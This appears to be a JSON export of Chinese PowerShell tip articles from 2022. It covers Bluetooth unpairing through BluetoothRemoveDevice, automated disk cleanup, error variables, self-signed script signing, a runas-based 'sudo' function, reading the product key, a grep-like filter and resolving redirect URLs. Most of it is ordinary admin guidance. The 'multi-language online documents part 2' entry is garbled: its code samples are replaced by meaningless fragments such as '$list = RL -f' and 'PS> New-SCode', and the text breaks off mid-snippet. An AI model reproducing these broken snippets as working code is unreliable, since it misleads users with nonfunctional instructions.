1PS&gt; explorer.exe ms-settings-connectabledevices:devicediscovery 这将立即弹出一个对话框，显示所有蓝牙设备。只需在 PowerShell 中添加一个函数，因此您不必记住命令，只需要将其放入个人资料脚本中： 123PS&gt; function Show-Bluetooth { explorer.exe ms-settings-connectabledevices:devicediscovery }PS&gt; Show-Bluetooth 如果您想在桌面放一个蓝牙图标的快捷方式，请尝试以下操作： 12345678$desktop = [Environment]::GetFolderPath('Desktop')$path = Join-Path -Path $desktop -ChildPath 'bluetooth.lnk'$shell = New-Object -ComObject WScript.Shell$scut = $shell.CreateShortcut($path)$scut.TargetPath = 'explorer.exe'$scut.Arguments = 'ms-settings-connectabledevices:devicediscovery'$scut.IconLocation = 'fsquirt.exe,0'$scut.Save()","link":"/2022/05/04/managing-bluetooth-devices-part-2/"},{"title":"PowerShell 技能连载 - 管理蓝牙设备（第 2 部分）","text":"如果您想通过编程方式删除配对的蓝牙设备，则没有内置的 cmdlet。 PowerShell 仍然可以解决问题，甚至通常可以解除配对无法通过 UI 删除或不断重复出现的蓝牙设备。 您需要首先删除蓝牙设备的硬件地址。 这是有关如何列出所有蓝牙设备并返回其硬件地址的示例： 1234567891011$Address = @{ Name='Address'Expression={$_.HardwareID |ForEach-Object { [uInt64]('0x' + $_.Substring(12))}}}Get-PnpDevice -Class Bluetooth | Where-Object HardwareID -match 'DEV_' | Select-Object FriendlyName, $Address | Where-Object Address | Out-GridView -Title 'Select Bluetooth Device to Remove' -OutputMode Single 结果看起来类似这样，并在网格视图窗口中显示，您可以在其中选择一个蓝牙设备： FriendlyName Address ------------ ------- Bamboo Ink Plus 480816531482 SMA001d SN: 2110109033 SN2110109033 550378395892 MX Master 3 20919489792 MX Keys 1089715743697 Bose QC35 II 44056255752152 附带说明，该代码说明了一个简单的技巧，可以以编程方式将十六进制数字转换为十进制： 1234PS&gt; $hex = 'A0FD'PS&gt; [int]&quot;0x$hex&quot;41213 一旦知道要解除配对的蓝牙设备的硬件地址，接下来，您必须将其传给一个内部的 Windows API。内部方法 Bluetoothremavyevice() 将其删除。 下面的代码灵感来自 Keith A. Miller 在 Microsoft 论坛中提供的建议。 以下是一个包装内部 Windows API 签名的函数，它输入一个硬件地址，然后解绑设备： 12345678910111213141516171819202122232425262728293031323334353637383940function Unpair-Bluetooth{ # take a UInt64 either directly or as part of an object with a property # named &quot;DeviceAddress&quot; or &quot;Address&quot; param ( [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] [Alias('Address')] [UInt64] $DeviceAddress ) # tell PowerShell the location of the internal Windows API # and define a static helper function named &quot;Unpair&quot; that takes care # of creating the needed arguments: begin { Add-Type -Namespace &quot;Devices&quot; -Name 'Bluetooth' -MemberDefinition '[DllImport(&quot;BluetoothAPIs.dll&quot;, SetLastError = true, CallingConvention = CallingConvention.StdCall)][return: MarshalAs(UnmanagedType.U4)]static extern UInt32 BluetoothRemoveDevice(IntPtr pAddress);public static UInt32 Unpair(UInt64 BTAddress) { GCHandle pinnedAddr = GCHandle.Alloc(BTAddress, GCHandleType.Pinned); IntPtr pAddress = pinnedAddr.AddrOfPinnedObject(); UInt32 result = BluetoothRemoveDevice(pAddress); pinnedAddr.Free(); return result;}' } # do this for every object that was piped into this function: process { $result = [Devices.Bluetooth]::Unpair($DeviceAddress) [PSCustomObject]@{ Success = $result -eq 0 ReturnValue = $result } }} 由于新函数 Unpair-Bluetooth 是支持管道的，因此您可以将其附加到以前的代码之后即可解除蓝牙配对： 123456789101112$Address = @{ Name='Address'Expression={$_.HardwareID |ForEach-Object { [uInt64]('0x' + $_.Substring(12))}}}Get-PnpDevice -Class Bluetooth | Where-Object HardwareID -match 'DEV_' | Select-Object FriendlyName, $Address | Where-Object Address | Out-GridView -Title 'Select Bluetooth Device to Unpair' -OutputMode Single | Unpair-Bluetooth 运行代码时，它再次显示所有蓝牙设备。选择一个要解除配对的设备，然后点击网格视图窗口右下角的确定。请注意，如果设备不是“记住的设备”，则解除配对会失败。当解除配对成功时，返回值为 0，并将设备从蓝牙设备列表中删除。","link":"/2022/05/06/managing-bluetooth-devices-part-3/"},{"title":"PowerShell 技能连载 - 清理硬盘（第 1 部分）","text":"cleanmgr.exe 是 Windows 自带的一个古老的工具，可以清除您的硬盘驱动器。 该工具可以删除各种垃圾数据，有时会删除许多 GB 的空间。对于 PowerShell 来说，它更有趣的地方在于支持自动化。 为了自动化清理磁盘，首先您需要启动具有管理员特权的 PowerShell（如果没有，不会提出错误，但是您的清理选择无法正确保存）。接下来，选择一个随机数，例如 5388，然后执行以下代码： 1PS&gt; cleanmgr.exe /sageset:5388 这将打开一个对话框窗口，您可以在其中选择下一步要执行的清理任务。检查所有适用的项目，然后单击“确定”。 现在，这些选择存储在您的自定义 ID 5388（或您选择的其他位置）下的 Windows 注册表中。 通过再次运行命令检查：对话框应再次打开并记住您的选择。如果对话框不记得您的选择，则可能没有使用管理员特权运行它。 要自动化磁盘清理，请使用参数 /sagerun 而不是 /sageset 运行命令，然后使用相同的 ID 号： 1PS&gt; cleanmgr /sagerun:5388 现在，清理程序无人值守地执行清理操作，因此这可能是某些情况下清理磁盘的最佳方法。 请注意，对话框显示清理进度，当前用户可以通过单击“取消”来中止清理。不过，无法隐藏此对话框。","link":"/2022/05/10/cleaning-hard-drive-part-1/"},{"title":"PowerShell 技能连载 - 清理硬盘（第 2 部分）","text":"在上一篇文章中，我们介绍了 Windows 工具 cleanmgr 及其参数 /sageset 和 /sagerun，您可以用它们来定义和运行自动硬盘清理。 今天，我们将研究如何自定义 cleanmgr.exe 执行的实际清理任务。 此工具将所有配置存储在 Windows 注册表的这个位置： HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches 在下面，您可以找到 cleanmgr 可以执行的每项清理任务的关键。在上一个技能中，我们定义了这样的自定义清理任务（请记住，使用提升的管理员权限执行它）： 1PS&gt; cleanmgr.exe /sageset:5388 这行命令打开一个对话框窗口，您可以在其中检查应绑定到已提交 ID 5388 的清理任务。 关闭对话框后，可以在 Windows 注册表中找到这些设置： 12345678910111213# the ID you picked when saving the options:$id = 5388# the name of the reg value that stores your choices:$flag = &quot;StateFlags$id&quot;# the location where user choices are stored:$path = &quot;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\*&quot;# get all subkeys where your user choice was enabled:Get-Item -Path $path | Where-Object { $_.Property -contains $flag } # contains your registry value (StateFlags5388) Where-Object { $_.GetValue($flag) -gt 0 } # your registry value contains a number greater than 0 执行结果准确列出了您先前在选择对话框中检查的清理器模块： Name Property ---- -------- Active Setup Temp Folders (default) : {C0E13E61-0CC6-11d1-BBB6-0060978B2AE6} Autorun : 1 Description : These files should no longer be needed. They were originally created by a setup program that is no longer running. FileList : *.tmp Flags : {124, 0, 0, 0} Folder : C:\\Windows\\msdownld.tmp|?:\\msdownld.tmp LastAccess : {2, 0, 0, 0} Priority : 50 StateFlags0001 : 2 StateFlags0003 : 2 StateFlags0033 : 0 StateFlags6254 : 0 StateFlags5388 : 2 BranchCache (default) : {DE661907-527D-4d6a-B6A6-EBC7F88D9B95} StateFlags0001 : 0 StateFlags0003 : 0 StateFlags0033 : 0 StateFlags6254 : 0 StateFlags5388 : 2 D3D Shader Cache (default) : {D8D133CD-3F26-402F-86DA-90B710751C2C} Autorun : 1 ReserveIDHint : 2 StateFlags0001 : 0 StateFlags0003 : 0 StateFlags0033 : 0 StateFlags6254 : 0 StateFlags5388 : 2 Delivery Optimization Files (default) : {4057C1AD-A51F-40BB-B960-22888CEB9812} Autorun : 0 Description : @C:\\WINDOWS\\system32\\domgmt.dll,-104 Display : @C:\\WINDOWS\\system32\\domgmt.dll,-103 Flags : 128 ReserveIDHint : 2 StateFlags0001 : 0 StateFlags0003 : 0 StateFlags0033 : 0 StateFlags6254 : 0 StateFlags5388 : 2 Diagnostic Data Viewer (default) : {C0E13E61-0CC6-11d1-BBB6-0060978B2AE6} database files Autorun : 0 CleanupString : rundll32.exe utcutil.dll,DiskCleanupEnd Description : @C:\\WINDOWS\\system32\\utcutil.dll,-302 Display : @C:\\WINDOWS\\system32\\utcutil.dll,-301 FileList : *.* Flags : 573 Folder : C:\\ProgramData\\Microsoft\\Diagnosis\\EventTranscript\\ IconPath : C:\\WINDOWS\\system32\\utcutil.dll,0 PreCleanupString : rundll32.exe utcutil.dll,DiskCleanupStart Priority : 100 StateFlags0001 : 0 StateFlags0003 : 0 StateFlags0033 : 0 StateFlags6254 : 0 StateFlags5388 : 2 Downloaded Program Files (default) : {8369AB20-56C9-11D0-94E8-00AA0059CE02} AdvancedButtonText : @C:\\Windows\\System32\\occache.dll,-1072 Autorun : 1 Description : @C:\\Windows\\System32\\occache.dll,-1071 Display : @C:\\Windows\\System32\\occache.dll,-1070 Priority : {100, 0, 0, 0} StateFlags0001 : 2 StateFlags0003 : 2 StateFlags0033 : 0 StateFlags6254 : 2 StateFlags5388 : 2 Internet Cache Files (default) : {9B0EFD60-F7B0-11D0-BAEF-00C04FC308C9} AdvancedButtonText : &amp;View Files Autorun : 1 Description : The Temporary Internet Files folder contains Web pages stored on your hard disk for quick viewing. Your personalized settings for Web pages will be left intact. Display : Temporary Internet Files Priority : 100 StateFlags0001 : 2 StateFlags0003 : 2 StateFlags0033 : 0 StateFlags6254 : 2 StateFlags5388 : 2 Language Pack (default) : {191D5A6B-43B9-477A-BB22-656BF91228AB} Autorun : 1 StateFlags0001 : 0 StateFlags0003 : 0 StateFlags0033 : 0 StateFlags6254 : 0 StateFlags5388 : 2 Old ChkDsk Files (default) : {C0E13E61-0CC6-11d1-BBB6-0060978B2AE6} Autorun : 1 FileList : *.CHK Flags : 288 Folder : ?:\\FOUND.000|?:\\FOUND.001|?:\\FOUND.002|?:\\FOUND.003|?:\\FOUND.004| ?:\\FOUND.005|?:\\FOUND.006|?:\\FOUND.007|?:\\FOUND.008|?:\\FOUND.009 IconPath : C:\\WINDOWS\\System32\\DATACLEN.DLL,3 Priority : 50 PropertyBag : {60F6E464-4DEF-11d2-B2D9-00C04F8EEC8C} StateFlags0001 : 2 StateFlags0003 : 2 StateFlags0033 : 0 StateFlags6254 : 2 StateFlags5388 : 2 Recycle Bin (default) : {5ef4af3a-f726-11d0-b8a2-00c04fc309a4} PluginType : 2 StateFlags0001 : 2 StateFlags0003 : 0 StateFlags0033 : 0 StateFlags6254 : 0 StateFlags5388 : 2 每个清理器模块在 “(default)” 中具有唯一的GUID。 如您所见，GUID “{C0E13E61-0CC6-11d1-BBB6-0060978B2AE6}” 用于许多清理模块。这是一个通用的文件删除模块，您可以轻松地在自己的文件清理器模块中使用。只需在注册表键 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches 中添加新的子键，使用上面提到的 GUID，然后配置该清理器应找到并删除的文件。您可能需要查看现有的清理器，例如 regedit.exe 中的 “Old ChkDsk Files”，以找出定义要删除文件的注册表值的名称。","link":"/2022/05/12/cleaning-hard-drive-part-2/"},{"title":"PowerShell 技能连载 - 专业地处理错误","text":"通常，PowerShell 脚本使用这样简单的错误报告形式，该报告的结构是这样的： 12345678910111213# clearing global error list:$error.Clear()# hiding errors:$ErrorActionPreference = 'SilentlyContinue'# do stuff:Stop-Service -Name Spoolerdir c:\\gibtsnichtabc# check errors at end:$error.Count$error | Out-GridView 尽管这没有错，但您应该了解 $error 是一个全局变量，因此，如果您在脚本中使用外部代码（即其他人写的功能或模块），这些作者可能已经使用了相同的技术，并且如果他们产生了错误并清除了全局错误列表，那么您将失去以前记录的错误。 一种更好，更健壮的方式是使用私有变量进行记录。 实际上并没有重写太多的代码： 123456789101112131415# hiding errors:$ErrorActionPreference = 'SilentlyContinue'# telling all cmdlets to use a private variable for error logging:$PSDefaultParameterValues.Add('*:ErrorVariable', '+myErrors')# initializing the variable:$myErrors = $null# do stuff:Stop-Service -Name Spoolerdir c:\\gibtsnichtabc# check errors at end USING PRIVATE VARIABLE:$myErrors.Count$myErrors | Out-GridView 基本技巧是定义 -ErrorVariable 的默认参数值，并为其分配私有变量的名称。确保在名称之前添加一个 “+”，以便附加新错误，而不是覆盖现有错误。","link":"/2022/05/16/professional-error-handling/"},{"title":"PowerShell 技能连载 - 签名 PowerShell 脚本（第 1 部分）","text":"如今，将数字签名添加到 PowerShell 脚本不再是黑魔法，尽管理想情况下需要从公司或可信赖的权威中获得正式的“信任”代码签名证书，但现在不再是强制性的。 在进行代码签名之前，首先了解为什么要对 PowerShell 脚本进行签名？ 数字签名是脚本代码的哈希，并使用数字证书的私钥进行加密。将其视为针对脚本的“包装器”或“密封”。有了它，您现在可以随时分辨出某人是否篡改了您的脚本。没有它，您将无法实现这个目的。 如果您尚未拥有适合代码签名的数字证书，那么在 Windows 机器上，您可以使用 New-SelfSignedCertificate cmdlet 快速创建一个。 运行此行代码以创建自己的全新代码签名证书，并将其存储在您的个人证书存储中（除非您使用 -NotAfter 指定不同的到期日期，否则有效期为一年）： 12345678PS&gt; New-SelfSignedCertificate -Subject MyPowerShellCode -Type CodeSigningCert -CertStoreLocation Cert:\\CurrentUser\\my -FriendlyName 'My Valid PowerShell Code' PSParentPath: Microsoft.PowerShell.Security\\Certificate::CurrentUser\\myThumbprint Subject---------- -------57402F9D82231CABA4586127C99819F055AA2AF2 CN=MyPowerShellCode 要稍后在任何时候检索它，请记住它的指纹并像这样访问它（修改指纹以匹配您的其中一个证书）： 1234567891011PS&gt; $cert = Get-Item -Path Cert:\\CurrentUser\\My\\57402F9D82231CABA4586127C99819F055AA2AF2PS&gt; $cert.SubjectCN=MyPowerShellCodePS&gt; $cert.FriendlyNameMy Valid PowerShell CodePS&gt; $cert.NotAfterMonday, May 1, 2023 17:47:43 或者，如果您只记得主题或友好名称，则可以使用过滤器： 12345678PS&gt; Get-ChildItem -Path Cert:\\CurrentUser\\My -CodeSigningCert | Where-Object Subject -like *MyPowerShell* PSParentPath: Microsoft.PowerShell.Security\\Certificate::CurrentUser\\MyThumbprint Subject---------- -------57402F9D82231CABA4586127C99819F055AA2AF2 CN=MyPowerShellCode 在下一个技能中，我们将开始使用此证书签署 PowerShell 脚本。","link":"/2022/05/18/code-signing-powershell-scripts-part-1/"},{"title":"PowerShell 技能连载 - 签名 PowerShell 脚本（第 2 部分）","text":"在上一个技能中，我们解释了如何使用 New-SeftSignedCert 创建自签名的代码签名证书。今天，我们将使用自签名或公司代码签名证书真实地对 PowerShell 脚本进行数字签名。 为此，请使用您想要的任何 PowerShell 脚本文件。您所需要的只是它的路径。另外，您需要一个在 Windows 证书存储中存储的有效代码签名证书的路径。这是第一部分的快速回顾，以创建自签名证书，以防您没有公司证书： 12345678910111213141516$Subject = 'MyPowerShellCode'$FriendlyName = 'My Valid PowerShell Code'# expires 5 years from now:$ExpirationDate = (Get-Date).AddYears(5)# store in user personal store:$certStore = 'Cert:\\CurrentUser\\my'# create certificate:$cert = New-SelfSignedCertificate -Subject $Subject -Type CodeSigningCert -CertStoreLocation $certStore -FriendlyName $FriendlyName -NotAfter $ExpirationDate$thumbprint = $cert.Thumbprint$Path = Join-Path -Path $certStore -ChildPath $thumbprintWrite-Warning &quot;Certificate Path: $Path&quot; 运行此代码时，您将获得一个自签名的代码签名证书，并且该代码将返回生成证书的路径，即： Cert:\\CurrentUser\\my\\F4C1F9978D564E143D554F3679746B3A79E1FF87 要使用您的证书，请像这样通过 Get-Item 读取它（确保修改匹配证书的路径 - 每个证书都有唯一的指纹）： 1PS&gt; $myCert = Get-Item -Path Cert:\\CurrentUser\\my\\F4C1F9978D564E143D554F3679746B3A79E1FF87 要将数字签名添加到 PowerShell 脚本文件（或其他能够为此问题携带数字签名的文件），请使用 Set-AuthenticodeSignature。运行以下演示代码（根据需要调整文件和证书的路径）： 123456789101112131415161718192021# digitally sign this file (adjust path to an existing ps1 file):$Path = &quot;$env:temp\\test.ps1&quot;# adjust this path to point to a valid code signing certificate:$CertPath = 'Cert:\\CurrentUser\\my\\F4C1F9978D564E143D554F3679746B3A79E1FF87'# if it does not exist, create a dummy file$exists = Test-Path -Path $Pathif ($exists -eq $false){ 'Hello World!' | Set-Content -Path $Path -Encoding UTF8}# read a code signing certificate to use for signing:$myCert = Get-Item -Path $CertPath# add a digital signature to a PS script file:Set-AuthenticodeSignature -FilePath $Path -Certificate $myCert# show changes inside script file:notepad $Path 运行此代码时，在 $Path 中指定的脚本文件将打开并显示添加到脚本底部的数字签名： Hello World! # SIG # Begin signature block # MIIFcAYJKoZIhvcNAQcCoIIFYTCCBV0CAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB # gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR # AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQU4QK+x7NLicgrIdzN+Nvxqbuq # Qv2gggMKMIIDBjCCAe6gAwIBAgIQG5jphqHXvLJFA0oCJTgcpDANBgkqhkiG9w0B ... 恭喜，您刚刚已经对一个 PowerShell 脚本进行了数字签名！我们将在第三部分中探讨这种签名的好处。","link":"/2022/05/20/code-signing-powershell-scripts-part-2/"},{"title":"PowerShell 技能连载 - 签名 PowerShell 脚本（第 3 部分）","text":"在上一部分中，我们创建了一个代码签名证书，并将其用于将数字签名添加到 PowerShell 脚本文件中。 然而，将数字签名添加到 PowerShell 脚本文件中可以做什么？ 使用 Get-AuthenticodeSignature 可以查看数字签名中的秘密。只需确保您调整 $Path 以指向具有数字签名的文件： 1234# path to a digitally signed file (adjust path to an existing signed ps1 file):$Path = &quot;$env:temp\\test.ps1&quot;$Status = Get-AuthenticodeSignature -FilePath $Path | Select-Object -Property *$Status 结果类似这样： SignerCertificate : [Subject] CN=MyPowerShellCode [Issuer] CN=MyPowerShellCode [Serial Number] 1B98E986A1D7BCB245034A0225381CA4 [Not Before] 01.05.2022 17:39:56 [Not After] 01.05.2027 17:49:56 [Thumbprint] F4C1F9978D564E143D554F3679746B3A79E1FF87 TimeStamperCertificate : Status : UnknownError StatusMessage : A certificate chain processed, but terminated in a root certificate which is not trusted by the trust provider Path : C:\\Users\\tobia\\AppData\\Local\\Temp\\test.ps1 SignatureType : Authenticode IsOSBinary : False 最重要的返回属性是 “Status”（及其在 “StatusMessage” 中找到的友好信息）。该属性告诉您签名的文件外的印章是否值得信赖和未被篡改： | Status | Description ||— |— || UnknownError | 文件未被篡改，但是签名用的数字证书可能不受信任 || HashMismatch | 自上次签名依赖，文件内容已改变 || Valid | 文件未被篡改，且数字证书受信任 || NotSigned | 文件未携带数字证书 | 最有可能的是，您会看到状态 “UnknownError”（如果您添加签名以来文件内容没有更改）或 “HashMismatch”（您或其他人确实更改了文件）。 您可能看不到 “Valid” 的原因是我们在此迷你系列中使用的证书类型：任何人都可以创建一个自签名的证书，以便攻击者可以更改脚本文件，然后使用他拥有自签名的证书以重新签名文件。 由于每个证书——公司或自签名——始终都有其独特的指纹，因此即使是对于自签名证书，您也可以通过同时检查 “Status” 和 “SignerCertificate.Thumbprint”，来确认脚本的完整性。当您还检查证书指纹时，邪恶的人就无法在不更改指纹的情况下重新签名脚本： 12345678# thumbprint of your certificate (adjust to match yours)$thumbprint = 'F4C1F9978D564E143D554F3679746B3A79E1FF87'# path to a digitally signed file (adjust path to an existing signed ps1 file):$Path = &quot;$env:temp\\test.ps1&quot;$Status = Get-AuthenticodeSignature -FilePath $Path | Select-Object -Property *$ok = $Status.Status -eq 'Valid' -or ($status.Status -eq 'UnknownError' -and $status.SignerCertificate.Thumbprint -eq $thumbprint)&quot;Script ok: $ok&quot;","link":"/2022/05/24/code-signing-powershell-scripts-part-3/"},{"title":"PowerShell 技能连载 - 为 PowerShell 创建 sudo（第 1 部分）","text":"在 Linux Shells 中，有一个名为 “sudo“ 的命令，可以通过它运行具有提升特权的命令。在 Powershell 中，您必须打开一个具有更高特权的全新 shell。 让我们尝试将 sudo 命令添加到 PowerShell。 我们想要一个名为 “sudo” 的新命令，它至少需要一个命令名称，但随后还需要一个可变的空格分隔的参数。这是函数的定义： 123456789101112131415function sudo{ param ( [Parameter(Mandatory)] [string] $FilePath, [Parameter(ValueFromRemainingArguments)] [string[]] $ArgumentList ) $PSBoundParameters} param() 块定义输入参数。$FilePath 是强制性的（必须）。$Arguments 是可选的，但通过属性 ValueFromRemainingArguments 装饰，因此它是一个所谓的“参数数组”，它能接受剩下的所有未绑定到其它形参的输入参数。 运行这段代码，然后尝试一些用例。$PSBoundParameters 显示该函数如何接收您的输入参数： 这是我测试的内容，它似乎按预期工作： 123456789101112131415PS&gt; sudo notepad c:\\testKey Value--- -----FilePath notepadArgumentList {c:\\test}PS&gt; sudo ping 127.0.0.1 -n 1Key Value--- -----FilePath pingArgumentList {127.0.0.1, -n, 1} Now that the sudo function body works, in part 2 we look at the actual implantation of running commands elevated.现在，sudo 函数体能正常工作，在第二部分中，我们将学习实际注入一个函数并提升权限。","link":"/2022/05/26/creating-sudo-for-powershell-part-1/"},{"title":"PowerShell 技能连载 - 为 PowerShell 创建 sudo（第 2 部分）","text":"当我们尝试为 PowerShell 创建一个 sudo 命令——来提升单个命令的权限——在第一部分中我们创建了 sudo 函数体： 12345678910111213141516function sudo{ param ( [Parameter(Mandatory)] [string] $FilePath, [Parameter(ValueFromRemainingArguments)] [string[]] $ArgumentList ) $PSBoundParameters} 现在，让我们用实际的逻辑替换 $PSBoundParameters，以运行提升权限的命令。Start-Process 可以解决这个问题。例如，这段代码将在用户 “Tobias” 下启动提升权限的记事本： 1PS&gt; Start-Process -FilePath notepad -ArgumentList $env:windir\\system32\\drivers\\etc\\hosts -Verb runas 巧合的是，我们的 sudo 函数体的参数名称与 Start-Process 所需的参数名称匹配，因此实现很简单：使用 splatting，并且将用户在自动定义的 $PSBoundParameters 哈希表中传入的参数传递给 Start-Process——这就是所有步骤： 并传递在自动定义的哈希表$ psboundparameters中找到的用户供给参数，以启动过程 - 全部： 12345678910111213141516function sudo{ param ( [Parameter(Mandatory)] [string] $FilePath, [Parameter(ValueFromRemainingArguments)] [string[]] $ArgumentList ) Start-Process @PSBoundParameters -Verb Runas} 运行代码，然后测试新的 sudo 命令。事实证明，您现在可以在脚本中运行提升权限的单个命令。同时，您将体会到 Windows 中的主要设计差异：所有命令都在自己的窗口中运行，并且无法从提升权限的命令中将结果重定向到您的 PowerShell。 虽然我们的 sudo 命令可能对提升权限很有用，但是当您想从提升权限的命令中获取信息时会受到限制。Windows 架构禁止该操作。 您在过程中学到了如何创建函数参数，例如接受可变数量参数的 “ArgumentList”。","link":"/2022/05/30/creating-sudo-for-powershell-part-2/"},{"title":"PowerShell 技能连载 - 读取 Windows 10 产品序列号","text":"有很多脚本可以通过转换一系列二进制值来读取注册表的原始 Windows 10 产品序列号。 不幸的是，这些脚本中找到的大多数算法都是弃用的，并且计算出的产品密钥是错误的。如果您计划重新安装操作系统，则有可能在删除了原来的系统后才发现。 这行代码可能是一种更好，更简单的方法： 1PS&gt; (Get-CimInstance -ClassName SoftwareLicensingService).OA3xOriginalProductKey 如果它返回 “nothing”，则机器中没有安装产品序列号。否则，它将原样返回。","link":"/2022/06/01/reading-windows-10-product-key/"},{"title":"PowerShell 技能连载 - 简单的类似 grep 的文本过滤器（第 1 部分）","text":"PowerShell 是面向对象的，因此与 Linux 和 grep 相比，文本过滤和正则表达式的应用不多。然而，有时候通过简单的文本模式来过滤命令对象是高效舒适的。 它的工作方式类似。PowerShell 确实带有类似 grep 的命令，即 Select-String cmdlet 。虽然它擅长过滤文件内容，但在尝试过滤命令输出时，它没什么用。 假设您只对运行中的服务感兴趣。按 “running” 来过滤，结果一无所获： 1PS&gt; Get-Service | Select-String Running 不过，这不是 Select-String 的错。Select-String 需要文本输入，而 cmdlet 通常返回强类型的对象，而不是文本。 通过将命令输出转换为字符串，就能正常工作了： 12345678PS&gt; Get-Service | Out-String -Stream | Select-String RunningRunning AdobeARMservice Adobe Acrobat Update ServiceRunning AgentShellService Spiceworks Agent Shell ServiceRunning Appinfo Application InformationRunning AppMgmt Application ManagementRunning AppXSvc AppX Deployment Service (AppXSVC)... 如果您不介意最终结果是纯文本，那就太好了。这基本上就是简单文本过滤的处理代价。 不，其实不是。您可以创建自己的过滤器命令，该命令 暂时 将传入的对象转换为文本，进行文本模式匹配，然后返回未更改的强类型对象。听起来很简单，确实如此。这是 Powershell 的 grep： 1234filter grep ([string]$Pattern){ if ((Out-String -InputObject $_) -match $Pattern) { $_ }} 运行代码，然后尝试： 123456789PS&gt; Get-Service | grep runningStatus Name DisplayName------ ---- -----------Running AdobeARMservice Adobe Acrobat Update ServiceRunning AgentShellService Spiceworks Agent Shell ServiceRunning Appinfo Application InformationRunning AppMgmt Application Management... 它的使用非常易于使用，最重要的是，输出强类型的对象，因此您仍然可以访问其属性 12345678910PS&gt; Get-Service | grep running | Select-Object Name, StartType, StatusName StartType Status---- --------- ------AdobeARMservice Automatic RunningAgentShellService Automatic RunningAppinfo Manual RunningAppMgmt Manual RunningAppXSvc Manual RunningAudioEndpointBuilder Automatic Running","link":"/2022/06/03/simple-text-based-filtering-a-la-grep-part-1/"},{"title":"PowerShell 技能连载 - 解析 URL","text":"URL 并不总是（直接）指向资源。通常，URL 充当始终指向最新版本的快捷方式或静态地址。PowerShell 可以揭示资源的真实URL，您可以在许多情况下使用它。 这是一个如何解析快捷链接的示例： 12345678# this is the URL we got:$URLRaw = 'http://go.microsoft.com/fwlink/?LinkID=135173'# we do not allow automatic redirection and instead read the information# returned by the webserver ourselves:$page = Invoke-WebRequest -Uri $URLRaw -UseBasicParsing -MaximumRedirection 0 -ErrorAction Ignore$target = $page.Headers.Location&quot;$URLRaw -&gt; $target&quot; 这是关于如何从静态链接解析产品版本的示例。最新版的 PowerShell 总是可以使用此静态 URL 获取： https://github.com/PowerShell/PowerShell/releases/latest 如果您想知道最新版本的实际版本号，请尝试解析 URL： 12345678$URLRaw = 'https://github.com/PowerShell/PowerShell/releases/latest'# we do not allow automatic redirection and instead read the information# returned by the webserver ourselves:$page = Invoke-WebRequest -Uri $URLRaw -UseBasicParsing -MaximumRedirection 0 -ErrorAction Ignore$realURL = $page.Headers.Location$version = Split-Path -Path $realURL -Leaf&quot;PowerShell 7 latest version: $version&quot; 同样的方法也适用于 PowerShell Gallery 模块： 12345678910# name of a module published at powershellgallery.com$ModuleName = 'ImportExcel'$URL = &quot;https://www.powershellgallery.com/packages/$ModuleName&quot;# get full URL (including latest version):$page = Invoke-WebRequest -Uri $URL -UseBasicParsing -MaximumRedirection 0 -ErrorAction Ignore$realURL = $page.Headers.Location# return version only:$latest = Split-Path -Path $realURL -Leaf&quot;Module $ModuleName latest version: $latest&quot;","link":"/2022/06/07/resolving-urls-3/"},{"title":"PowerShell 技能连载 - 值得一读：PowerShell 语言规范","text":"今天我很荣幸地向您介绍微软官方的 PowerShell 语言规范。作为经验丰富的 Powershell 脚本编写者，您可以通过查看 PowerShell 语言本身的规范来获得很多内部知识。 语言规范解释了数十亿个和操作相关的细节，例如预定义变量，内置关键字，操作符优先级等的全面列表。您可以在此处找到在线的语言规范： https://docs.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-01?view=powershell-7.2 这 13 章也已翻译成多种语言。 中文版可以在这里找到： https://docs.microsoft.com/zh-cn/powershell/scripting/lang-spec/chapter-01?view=powershell-7.2","link":"/2022/06/09/worth-a-read-powershell-language-definition/"},{"title":"PowerShell 技能连载 - 检测多语言在线文档（第 2 部分）","text":"要如何自动检查在线文档所支持的语言？ 如果 URL 使用语言 ID，则很容易创建具有所有可用语言 ID 的 URL 列表。 这就是我们到目前为止第一部分中所做的： 1$list = RL -f 在第二部分中，我们现在确定列表中实际存在的 URL。但是，仅仅试图通过 Invoke-WebRequest 访问 URL 是不够的： 1$list = RL -f 事实证明，所有 URL 访问的都是微软的 WEB 服务器，并且返回的状态都是 “OK”（包括不存在的语言）： 1PS&gt; New-SCode 这是因为微软的 WEB 服务器（与许多其它服务器一样）首先接受所有URL。然后，在内部，WEB 服务器弄清楚下一步该怎么做，并将新的 URL 返回到浏览器中。可能是原始的 URL（如果 WEB 服务器找到了资源），也可以是一个全新的 URL，例如通用搜索站点或自定义的“未找到”通知。”OK” 状态与 URL 的有效性无关。 您实际上可以通过禁止自动重定向来查看内部工作。对 Invoke-WebRequest 命令添加参数 “-MaximumRedirection 0 -ErrorAction Ignore“： 1$list = RL -f 现在，您可以看到 Web 服务器如何告诉浏览器，URL 转移到其他地方，有效地将浏览器重定向到新 URL。 因此检查 URL 是否存在，取决于特定的 WEB 服务器的工作原理。在微软的例子中，事实证明有效的 URL 会导致单次重定向，而无效的 URL 会导致更多此重定向。将重定向限制为一次，可以区分有效和无效的 URL。 这是最终解决方案，还支持一个实时的进度条。 它在网格视图窗口中显示可用的本地化在线文档，您可以选择一个或多个以在浏览器中显示。您也可以在 $result 中取得结果，将其打印到 PDF 并将其提交给多种语言的员工。 12$list = $h.Keys | ForEach-Object { $URL -f","link":"/2022/06/15/identifying-multi-language-online-documents-part-2/"},{"title":"PowerShell 技能连载 - 检测多语言在线文档（第 1 部分）","text":"在之前的技能中，我们介绍了官方的 PowerShell 语言规范，该规范提供了许多不同语言的在线版本。这引出了有关受支持的语言的问题。 通常，多语言在线文档使用相同的URL，只需更改语言 ID 即可。例如，英语和德语版在其语言 ID 上有所不同： https://docs.microsoft.com/de-de/powershell/scripting/lang-spec/chapter-01?view=powershell-7.2 https://docs.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-01?view=powershell-7.2 为了自动找出所有可用的翻译，我们首先需要一个有可能的语言 ID 列表并构建假想的URL。然后，我们需要一种方法来检查这些 URL 